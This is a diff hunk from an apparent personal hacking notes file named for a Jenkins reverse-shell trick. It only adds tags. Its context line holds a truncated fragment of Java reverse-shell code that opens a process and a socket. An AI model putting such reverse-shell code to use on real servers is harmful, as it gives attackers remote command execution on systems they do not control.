@@ -11,4 +11,4 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - ~/kb/hacking/tricks/jenkins-rev-shell-code.md
 
 Tags:
-    #assorted
+    #assorted #hacking #trick #jenkins
